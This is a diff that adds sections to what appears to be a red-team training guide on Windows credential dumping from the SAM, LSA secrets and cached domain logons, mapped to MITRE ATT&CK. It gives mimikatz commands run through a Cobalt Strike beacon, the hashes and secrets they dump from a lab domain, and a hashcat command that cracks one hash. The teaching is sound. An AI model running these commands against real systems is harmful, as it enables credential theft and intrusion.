@@ -128,4 +128,93 @@ TargetUser: NT AUTHORITY\SYSTEM
 
 > The **GrantedAccess** mask of `0x1010` is consistent with `PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ`, which are the minimum privileges required for reading memory.
 
-### Security Account Manager
+### Security Account Manager (SAM)
+The Security Account Manager (SAM) stores the credentials for local accounts across the `HKLM\sam` and `HKLM\system` hives.  An adversary may extract the usernames and password hashes [T1003.002](https://attack.mitre.org/techniques/T1003/002/) from this database.
+
+```powershell
+beacon> mimikatz !lsadump::sam
+
+Domain : LON-WKSTN-1
+SysKey : a975bfd9830a0c6a82f3449ccc88432d
+Local SID : S-1-5-21-3729176663-3746934411-1052919527
+
+SAMKey : a895742da6fa699fbbf1d410bfbe49e0
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
+    lm  - 0: 4b2c6e5db76fe295603b423c72f9b271
+    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
+    ntlm- 1: fc525c9683e8fe067095ba2ddc971889
+```
+
+The local RID-500 Administrator is not the same as the default Domain Administrator account, and is often disabled.  However, this is useful in cases where a) the account is enabled, and b) the same password is set on every other machine in the domain.
+
+### LSA Secrets
+LSA secrets is another piece of protected storage used by the Local Security Authority (LSA).  It can be a bit of a mish-mash as to what's kept in here, but common candidates include service accounts passwords, the machine's domain account password, and EFS encryption keys.  Adversaries can extract [[T1003.004](https://attack.mitre.org/techniques/T1003/004/)] secrets that are cached in memory, or directly from the `HKLM/Security/Policy/Secrets` registry hive.  These are encrypted, but the key is stored in `HKLM/Security/Policy`.
+
+Mimikatz's `lsadump::secrets` command will automatically fetch and decrypt the secrets.
+
+```powershell
+beacon> mimikatz !lsadump::secrets
+
+Domain : LON-WKSTN-1
+SysKey : a975bfd9830a0c6a82f3449ccc88432d
+
+Local name : LON-WKSTN-1 ( S-1-5-21-3729176663-3746934411-1052919527 )
+Domain name : CONTOSO ( S-1-5-21-3926355307-1661546229-813047887 )
+Domain FQDN : contoso.com
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648}
+  [00] {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648} d29b6c62cff0caac88bf40267d2001c987fd597f4c3f1490da0ff2da60163887
+
+Secret  : $MACHINE.ACC
+cur/text: sG!&=qn>D(EUr\T!G0F9eP2i.&<@?U[S0djrA@i\Bk+_n_aWG5\N@s<JQ@4X_hV8&rsX,tTL^ nCv >1k*.).kLW`'5)9!&9dMIIDg_v@mdA-Y,Z/Qbe]p*_
+    NTLM:3cad4d50decc7d04e6fec0a3c3793cc0
+    SHA1:e617ea24446bf924e8b7b2e603e9095e45b96ad3
+old/text: sG!&=qn>D(EUr\T!G0F9eP2i.&<@?U[S0djrA@i\Bk+_n_aWG5\N@s<JQ@4X_hV8&rsX,tTL^ nCv >1k*.).kLW`'5)9!&9dMIIDg_v@mdA-Y,Z/Qbe]p*_
+    NTLM:3cad4d50decc7d04e6fec0a3c3793cc0
+    SHA1:e617ea24446bf924e8b7b2e603e9095e45b96ad3
+```
+
+### Cached Domain Credentials
+Windows computers that have been joined to a domain often cache domain logon information after a user has logged in.  This is for cases where a user wants to logon to the computer but the domain controller is not accessible (think of laptops).  The number of logons to cache is controlled by the `CachedLogonCount` key in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`.  This can range from 0 to 50, but the default is 10.
+
+The credentials themselves are stored in a hashed format called MS-Cache v2.  These cannot be used with techniques like pass-the-hash; they must be extracted [[T1003.005](https://attack.mitre.org/techniques/T1003/005/)] and cracked offline to recover the plaintext passwords.
+
+```powershell
+beacon> mimikatz !lsadump::cache
+
+Domain : LON-WKSTN-1
+SysKey : a975bfd9830a0c6a82f3449ccc88432d
+
+Local name : LON-WKSTN-1 ( S-1-5-21-3729176663-3746934411-1052919527 )
+Domain name : CONTOSO ( S-1-5-21-3926355307-1661546229-813047887 )
+Domain FQDN : contoso.com
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648}
+  [00] {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648} d29b6c62cff0caac88bf40267d2001c987fd597f4c3f1490da0ff2da60163887
+
+* Iteration is set to default (10240)
+
+[NL$1 - 17/02/2025 09:52:55]
+RID       : 00000451 (1105)
+User      : CONTOSO\pchilds
+MsCacheV2 : 3566ba05cfe9d5314144ebef07289cdc
+
+[NL$2 - 17/02/2025 09:53:40]
+RID       : 00000454 (1108)
+User      : CONTOSO\rsteel
+MsCacheV2 : 0ac91f0033a92c25a174679953789ba
+```
+
+>Take note of the number of iterations the passwords are hashed with, as this is required when attempting to crack them.  The default (as indicated by the output above) is 10240.
+
+These can be cracked using hash mode 2100 in Hashcat, although it's another slow format owing to the number of iterations (1085 kH/s on my 4070).
+
+```powershell
+PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
+$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!
+```
